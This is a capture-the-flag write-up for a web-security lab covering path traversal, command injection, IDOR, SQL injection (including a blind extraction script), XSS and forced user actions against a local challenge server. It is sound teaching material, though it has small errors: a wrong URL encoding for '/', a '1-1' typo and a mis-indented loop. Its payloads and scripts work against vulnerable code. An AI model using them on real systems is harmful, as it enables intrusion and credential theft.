---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 9
---

## level 1

> Exploit a path traversal vulnerability

```py title="level 1 source code"
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

As we can see from the source code, the server takes the `path` parameter from the request arguments and then returns the result.

So we can just send a request with the `path` parameter set to `/flag`.

```
hacker@web-security~level1:/$ curl 'http://challenge.localhost/?path=/flag'
```

&nbsp;

## level 2

> Exploit a command injection vulnerability

```py title="level 2 source code"
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

As we can see, the server takes the value given to the `timezone` parameter.

It then inserts the argument in the shell command to retrieve the date.

```
## Resultant command
TZ={timezone} date
```

From the above command, the shell set the environment variable `TZ` to our provided value and then executes the `date` command in that context.

We can provide `UTC` as the value and see what output it provides.

```
## Request
http://challenge.localhost/?timezone=UTC

## Resultant command:
TZ=UTC date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/73567980-d93d-452c-af32-4b401ba92097)

Now let's try the same with `MST` as the value.

```
## Request:
http://challenge.localhost/?timezone=UTC

## Resultant command:
TZ=MST date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/4baabe84-7bd9-4b78-95d5-a407b95b658e)

As we can see in the third command of both examples and the `Result`, the `date` command is influenced by the value of the `TZ` variable, which we control.

### Command Injection

#### Backticks 

If we provide the `whoami` command with backticks, the shell executes the command within the backticks and substitutes it's result in the 

```
## Request:
http://challenge.localhost/?timezone=`whoami`

## Resultant command:
TZ=`whoami` date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)

Once it has the result for the `whoami` command, the shell will substitute the result in the `TZ` variable.

```
## Resultant command:
TZ=root date
```

![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=`whoami`'
Wed Jun  5 04:12:07 root 2024
```

#### Semicolon `;`

If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.

```
## Request:
http://challenge.localhost/?timezone=;whoami;

## Resultant command:
TZ=;
root;
date
```

While sending the request, we have to URI encode the `;` character with `%3B`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B'
root
Wed Jun  5 04:20:22 UTC 2024
```

#### Hash `#`

If we use the hash `#` character, it comments out everything that comes afterwards.

```
## Request:
http://challenge.localhost/?timezone=;whoami;#

## Resultant command
TZ=;
root;
#date    ## The date command is commented out
```

While sending the request, we have to URI encode the `#` character with `%23`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bwhoami%3B%23'
root
```

Now, we can use all of these concepts to `cat` out the `/flag` file.

```
## Request:
http://challenge.localhost/?timezone=;cat /flag;#

## Resultant command:
TZ=;
cat /flag;
#date    ## The date command is commented out
```

While sending the request, we have to URI encode the ` ` character with `%20`  and the `/` character with `%27`.

```
hacker@web-security~level2:/$ curl 'http://challenge.localhost/?timezone=%3Bcat%20%2Fflag%3B%23'
```

&nbsp;

## level 3

> Exploit an authentication bypass vulnerability

```py title="level 3 source code"
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

Using POST method to make the request will acticvate the first conditional which we do not want.
We only want to retrieve the flag wihout having to authenticate.

### Insecure Direct Object Reference (IDOR)

IDOR allows attackers to reference data which they otherwise shouldn't be able to.

The user retrieveal part of the code is what we are going to exploit.

```py
if "user" in request.args:
    user_id = int(request.args["user"])
    user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
    if user:
        username = user["username"]
        if username == "flag":
            return f"{flag}\n"
        return f"Hello, {username}!\n"
```

If the `user` parameter is in the request arguments, the code fetches the user by `rowid` and displays a message. If the username is `lag`, it returns the flag.

```
hacker@web-security~level3:/$ curl 'http://challenge.localhost/?user=1'
```

&nbsp;

## level 4

> Exploit a structured query language injection vulnerability to login

```py title="level 4 source code"
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

We can see that out input data is being inserted within the SQL query.

```
SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
```

If we provide the following input:

```
username: flag
password: flag
```

The resultant SQL query will be:

```
SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag"
```

Unless the credentials are valid this will not get us the flag.

### SQL Injection

However, since our user input is being directly inserted within the query without any sort of parameterization or binding, we can perform a SQL injection.

#### Login bypass by commnenting out password check

If we provide the following input:

```
username: flag"--
password: flag
```

The resultant SQL query will be:

```
## Resultant query:
SELECT rowid, * FROM users WHERE username = "flag"--" AND password = "flag"

## Queried part:
SELECT rowid, * FROM users WHERE username = "flag"

## Commented part:
" AND password = "flag"
```

Since we are commenting out the WHERE clause that requires the password, we will be logged in even if the password is correct.

```python
import requests

data={
	"username": 'flag" --',
	"password": 'flag'
}

response = requests.post("http://challenge.localhost/", data = data)
print(response.text)
```

#### Login bypass by breaking password check

If we provide the following input:

```
username: flag
password: flag" OR 1-1--
```

The resultant SQL query will be:

```
## Resultant query:
SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1--"

## Queried part:
SELECT rowid, * FROM users WHERE username = "flag" AND password = "flag" OR 1-1

## Commented part:
"
```

Since the result of 1=1 is always `true/1` and anything OR with 1 is 1, the query will always be executed even if the password  we provided isn't correct.

```py
import requests

data={
	"username": 'flag',
	"password": '" OR 1=1 --'	
}

response = requests.post("http://challenge.localhost/", data = data)
print(response.text)
```

&nbsp;

## level 5

> Exploit a structured query language injection vulnerability to leak data

```py title="level 5 source code"
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

This level selects usernames from the `users` table where the username matches the `query` parameter.

The user input is inserted into the SQL query without parameterization.

```
SELECT username FROM users WHERE username LIKE "{query}"
```

### SQL Injection

This means that we can perform a SQL injection.

#### UNION attack

If we provide the following parameter:

```
"query": 'flag" UNION SELECT password FROM users --'
```

The resultant SQL query will be:

```
## Resultant query:
SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users --"

## Queried part:
SELECT username FROM users WHERE username LIKE "flag" UNION SELECT password FROM users

## Commented part:
"
```

Since we are using thw UNION operator, the server will list out users with username similar to `flag`, and then list out the password from the `users` table.

```python
import requests

params={
	"query": 'flag" UNION SELECT password FROM users --'
}

response = requests.get("http://challenge.localhost/", params = params)
print(response.text)
```

&nbsp;

## level 6

> Exploit a structured query language injection vulnerability with an unknown database structure

```py title="level 6 source code"
def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

This level creates the table using the hash of the flag. This means that the table name is randomly generated.

The user input in inserted into the SQL query without parameterization.

```
SELECT username FROM {table_name} WHERE username LIKE "{query}"
```

### SQL Injection

In order to retrieve the flag, we first need to retrieve the table name. We can refer this [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) list.

#### Retrieving SQLite version

The SQLite version can be retrieved using the following query:

```
select sqlite_version();
```

If we provide the following request:

```
"query": '" UNION SELECT sqlite_version(); --'
```

The resultant query will be:

```
## Resultant query:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sqlite_version(); --"

## Queried part:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sqlite_version();

## Commented part:
"
```

```py
import requests

params={
	"query": '" UNION SELECT sqlite_version(); --'
}

response = requests.get("http://challenge.localhost/", params = params)
print(response.text)
```
```
3.31.1
```

#### Listing the tables

For SQLite verions `3.33.0` and previous, the `sqlite_master` master contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.

```
SELECT sql FROM sqlite_master
```

If we provide the following request:

```
"query": '" UNION SELECT sql FROM sqlite_master --'
```

The resultant query will be:

```
## Resultant query:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sql FROM sqlite_master --"

## Queried part:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT sql FROM sqlite_master

## Commented part:
"
```

```py
import requests

params={
	"query": '" UNION SELECT sql FROM sqlite_master --'
}

response = requests.get("http://challenge.localhost/", params = params)
print(response.text)
```
```
CREATE TABLE table2652065454664187289(
  username,
  password
)
```

#### Retrieving the password

Now that we know the table name is `table2652065454664187289``, we can easily retrieve the password from the table.

If we provide the following request:

```
"query": '" UNION SELECT password FROM table2652065454664187289 --'
```

The resultant query will be:

```
## Resultant query:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT password FROM table2652065454664187289 --"

## Queried part:
SELECT username FROM {table_name} WHERE username LIKE "" UNION SELECT password FROM table2652065454664187289

## Commented part:
"
```

```py
import requests

params={
	"query": '" UNION SELECT password FROM table2652065454664187289 --'
}

response = requests.post("http://challenge.localhost/", params = params)
print(response.text)
```

&nbsp;

## level 7

> Exploit a structured query language injection vulnerability to blindly leak data

```py
def level7():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

We can see that out input data is being inserted within the SQL query.

```
SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"
```

However, this level does not print out the flag onto the screen, instead it prints out a `Hello, {username}!` message.

### SQL Injection

In order to retrieve the flag, we first need to perform a Blind SQL Injection.

#### Blind attack

Before we perform the attack we need to learn more about the `SUBSTR()` function.

![image](https://github.com/Kunull/Write-ups/assets/110326359/ec609e62-def0-46f2-b58a-cb7d332e11ca)

```
## Extract the one character from the string starting at the first position
SUBSTR("pwn.college", 1, 1)

## Result:
p
```

```
## Extract the one character from the string starting at the second position
SUBSTR("pwn.college", 2, 1)

## Result:
w
```

```
## Extract the one character from the string starting at the third position
SUBSTR("pwn.college", 3, 1)

## Result:
n
```

Now we have to write a script that loops over and checks the next byte with a set of characters.

We also need to create an empty string.
If the script finds the `Hello, {username}!` message, within the response, it will append the character to the flag string.

```py
import string
import requests

searchspace = string.ascii_letters + string.digits + '{}._-'
solution = ''

while True:
    found = False
    for char in searchspace:
        data = {
            "username": f'" OR SUBSTR(password, {len(solution)+1}, 1) = \'{char}\' --',
            "password": 'flag'
        }
       
        response = requests.post("http://challenge.localhost/", data=data)
       
        if response.text.startswith("Hello"):
            solution += char
            print(solution)
            found = True
            break
    
if not found:
        break
```

&nbsp;

## level 8

> Exploit a cross site scripting vulnerability

```py title="level 8 source code"
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

This level takes the `echo` argument and return HTML generated with that argument.

It then checks if there is an alert on the page. If yes, it returns the flag.

### Cross-Site Scripting (XSS)

We can generate an alert using a `<script>` tag. Anything we put within the tag is treated as a script and executed.

```html
<script>alert(1)</script>
```

```
hacker@web-security~level8:/$ curl 'http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<script>alert(1)</script>'
```

```py
import requests

response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<h1>alert(1)</h1>")
print(response.text)
```

&nbsp;

## level 9

> Exploit a cross site scripting vulnerability with more complicated context

```py title="level 9 source code"
def level9():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(f"<textarea>{echo}</textarea>")

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

This level inserts our input within the `<textarea>` tag.

```
return html(f"<textarea>{echo}</textarea>")
```

### Cross-Site Scripting (XSS)

If we provide the script it will not be executed because it is wihin the `<textarea>` tag.

```html
<textarea><script>alert(1)</script></textarea>
```

#### Escaping outer tag (`<textarea>`)

We can escape the outer `<textarea>` tag by closing out the opening tag before providing our script.

```html
<textarea></textarea><script>alert(1)</script></textarea>
```

```py
import requests

response = requests.get("http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=</textarea><script>alert(1)</script>")
print(response.text)
```

&nbsp;

## level 10

> Exploit a cross site scripting vulnerability to cause a user action

```py title="level 10 source code"
def level10():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```

In this level, there are two different pages that we have to visit:

1. `/visit`: 
	- Checks that a url argument is provided in the query string.
	- Parses the URL and ensures the hostname matches challenge_host.
	- Uses a browser automation tool to visit the login page of the challenge host, log in with the username "flag" and the provided password, then visit the provided URL.
	- Returns "Visited".

2. `/leak`:
	- Retrieves the logged-in user's ID from the session.
	- Fetches the user from the database using the rowid.
	- If the user exists, updates the leak column to TRUE for that user.
	- Returns "Leaked".

3. `/info`: 
	- Checks that a user argument is provided in the query string.
	- Fetches the user with the specified rowid from the database.
	- If the user exists, prepares a response containing the username.
	- If the leak column is TRUE, also includes the password.
	- Returns the collected info as a string.


In order to retrieve the password, we need to visit the `/info` path. However, since the `leak` flag is set to `FALSE` by default, we won't be able to retrieve the password directly.

The `/leak` path checks if the logged in user exists and then sets the `leak` flag is set to `TRUE`.

In order to login, we can exploit the automated login used at the `/visit` path.

```python
import requests

params = {
	"url": "http://challenge.localhost/leak"
}

response = requests.get("http://challenge.localhost/visit", params = params)
print(response.text)
```

```python
import requests

params = {
	"user": 1
}

response = requests.get("http://challenge.localhost/info", params = params)
print(response.text)
```

  
